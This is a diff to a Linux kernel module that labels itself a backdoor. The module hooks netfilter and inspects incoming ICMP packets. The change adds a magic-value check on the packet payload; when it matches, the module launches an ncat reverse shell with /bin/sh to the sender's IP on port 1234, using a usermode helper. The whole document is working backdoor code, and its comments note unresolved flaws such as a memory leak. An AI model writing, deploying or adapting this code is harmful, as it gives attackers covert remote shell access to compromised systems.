@@ -53,6 +53,7 @@ static struct nf_hook_ops *netf_hook = NULL;
 void debugPrint(char *printMe) {
 	#if DEBUG
 	printk(printMe);
+	printk("\n");
 	#endif
 }
 
@@ -101,7 +102,7 @@ int run_command(char * command){
     if(!info) goto free_cmd_string;
 
     return call_usermodehelper_exec(info, UMH_WAIT_EXEC); // 0 = don't wait
-
+    // memory leak!!!
     free_cmd_string:
         kfree(cmd_string);
     free_argv:
@@ -120,6 +121,7 @@ void magic_command(char *IP) {
 		debugPrint("Trying reverse shell");
 
 		snprintf(command, 100, "/usr/bin/ncat -e /bin/sh %s 1234", IP);
+		debugPrint(command);
 		run_command(command); // This command will give us reverse shell
 	}
 	else {
@@ -134,7 +136,12 @@ void magic_command(char *IP) {
 unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
 	struct iphdr *ip_header;
+	//const struct icmphdr *icmp_header;
 	struct iphdr _iph;
+	struct icmphdr _icmph;
+	const char *data = NULL;
+	char *_data;
+	int size, str_size;
 	char sourceIP[16];
 
 	if (!skb)
@@ -149,8 +156,32 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 		snprintf(sourceIP, 16, "%pI4", &ip_header->saddr); // Mind the &!
 		debugPrint("Got ICMP packet! (address one line down)");
 		debugPrint(sourceIP);
-		magic_command(sourceIP); // Start reverse shell
-		return NF_DROP;
+
+		// Calculate where the data of the packet is...
+		size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
+		_data = kmalloc(size, GFP_KERNEL);
+
+		if (!_data)
+			return NF_ACCEPT;
+
+		str_size = size - strlen(MAGIC_VALUE);
+
+		data = skb_header_pointer(skb, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);
+
+		if (!data) {
+			kfree(_data);
+			return NF_ACCEPT;
+		}
+
+		// Check if data of packet is our magic value (hello)
+		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
+			debugPrint("Got packet with magic!");
+			magic_command(sourceIP); // Start reverse shell
+			return NF_DROP;
+		}
+		
+		debugPrint("Packet data is not magic.");
+		return NF_ACCEPT;
 	}
 
 	return NF_ACCEPT;
@@ -276,7 +307,7 @@ void unregister_icmp_listener(void) {
 
 // Start module
 static int __init start_module(void) {
-	debugPrint(KERN_INFO "Started backdoor.\n");
+	debugPrint(KERN_INFO "Started backdoor.");
 
 	register_icmp_listener();
 	return 0;
@@ -285,7 +316,7 @@ static int __init start_module(void) {
 // Remove module
 static void __exit stop_module(void) {
 	unregister_icmp_listener();
-	debugPrint(KERN_INFO "Stopped backdoor.\n");
+	debugPrint(KERN_INFO "Stopped backdoor.");
 }
 
 module_init(start_module);
